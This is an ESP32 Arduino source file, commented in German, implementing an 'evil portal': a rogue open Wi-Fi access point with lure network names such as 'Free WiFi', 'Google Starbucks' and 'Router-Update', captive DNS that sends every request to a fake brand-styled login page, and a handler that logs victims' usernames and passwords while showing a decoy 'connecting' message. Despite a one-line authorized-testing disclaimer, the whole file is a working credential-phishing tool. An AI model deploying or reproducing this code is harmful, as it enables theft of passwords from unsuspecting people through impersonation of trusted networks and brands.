// G4MEOVER — Evil Portal (Implementierung). Siehe evil_portal.h.
// NUR fuer autorisierte Security-Tests / eigene Hardware / CTF.
#include "evil_portal.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>

static WebServer  s_server(80);
static DNSServer  s_dns;
static bool       s_active   = false;
static uint8_t    s_espnowCh = 1;
static uint32_t   s_creds    = 0;
static const IPAddress AP_IP(192, 168, 4, 1);

// Portal-Profile: SSID + sichtbarer Marken-/Titeltext (ein HTML-Skelett, variabel).
struct Portal { const char* ssid; const char* brand; const char* note; };
static const Portal PORTALS[] = {
    {"Free WiFi",            "Kostenloses WLAN",   "Zum Fortfahren bitte anmelden."},
    {"Airport_Free_WiFi",    "Airport Internet",   "Melden Sie sich fuer 60 Min gratis an."},
    {"Google Starbucks",     "Google WiFi",        "Mit Google-Konto verbinden."},
    {"Router-Update",        "Router-Sicherheit",  "Firmware-Update erfordert Login."},
};
#define PORTAL_COUNT (sizeof(PORTALS) / sizeof(PORTALS[0]))
static uint8_t s_id = 0;

static String page() {
    const Portal& p = PORTALS[s_id];
    String h = F("<!doctype html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
                 "<title>");
    h += p.brand;
    h += F("</title><style>body{font-family:sans-serif;background:#f2f2f2;margin:0}"
           ".c{max-width:340px;margin:12% auto;background:#fff;padding:24px;border-radius:10px;"
           "box-shadow:0 2px 12px #0002}h2{margin:0 0 4px}p{color:#666;font-size:14px}"
           "input{width:100%;box-sizing:border-box;padding:11px;margin:7px 0;border:1px solid #ccc;border-radius:6px}"
           "button{width:100%;padding:12px;border:0;border-radius:6px;background:#1a73e8;color:#fff;font-size:15px}"
           "</style></head><body><div class=c><h2>");
    h += p.brand; h += F("</h2><p>"); h += p.note;
    h += F("</p><form method=POST action=/login>"
           "<input name=u type=text placeholder='E-Mail / Benutzername' required>"
           "<input name=p type=password placeholder='Passwort' required>"
           "<button type=submit>Verbinden</button></form></div></body></html>");
    return h;
}

static void handlePortal() { s_server.send(200, "text/html", page()); }

static void handleLogin() {
    String u = s_server.arg("u"), pw = s_server.arg("p");
    s_creds++;
    Serial.printf("[EVIL-PORTAL] Login #%lu  user='%s'  pass='%s'  (ssid=%s)\n",
                  (unsigned long)s_creds, u.c_str(), pw.c_str(), PORTALS[s_id].ssid);
    // Glaubhafte Antwort: „Verbinde…", damit das Opfer nichts merkt.
    s_server.send(200, "text/html",
        F("<html><body style='font-family:sans-serif;text-align:center;margin-top:20%'>"
          "<h3>Verbindung wird hergestellt…</h3><p>Bitte warten.</p></body></html>"));
}

void evil_portal_start(uint8_t portal_id, uint8_t espnow_channel) {
    if(s_active) return;
    s_id       = portal_id % PORTAL_COUNT;
    s_espnowCh = espnow_channel ? espnow_channel : 1;
    s_creds    = 0;

    WiFi.mode(WIFI_AP_STA);                 // AP fuer Portal; STA bleibt fuer spaeteres ESP-NOW
    WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(PORTALS[s_id].ssid);        // offenes Netz (Kanal 1 = ESP-NOW-Kanal)
    delay(80);

    s_dns.setErrorReplyCode(DNSReplyCode::NoError);
    s_dns.start(53, "*", AP_IP);            // Captive-DNS: alles zeigt auf die AP-IP

    s_server.on("/login", HTTP_POST, handleLogin);
    s_server.onNotFound(handlePortal);      // jede andere URL -> Login-Seite (Captive-Redirect)
    s_server.begin();

    s_active = true;
    Serial.printf("[EVIL-PORTAL] aktiv: SSID='%s' IP=%s\n",
                  PORTALS[s_id].ssid, AP_IP.toString().c_str());
}

void evil_portal_stop() {
    if(!s_active) return;
    s_server.stop();
    s_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_channel(s_espnowCh, WIFI_SECOND_CHAN_NONE);   // ESP-NOW-Kanal zurueck
    s_active = false;
    Serial.printf("[EVIL-PORTAL] gestoppt (%lu Logins erfasst)\n", (unsigned long)s_creds);
}

void evil_portal_tick() {
    if(!s_active) return;
    s_dns.processNextRequest();
    s_server.handleClient();
}

bool        evil_portal_active()     { return s_active; }
uint32_t    evil_portal_cred_count() { return s_creds; }
const char* evil_portal_ssid()       { return PORTALS[s_id].ssid; }
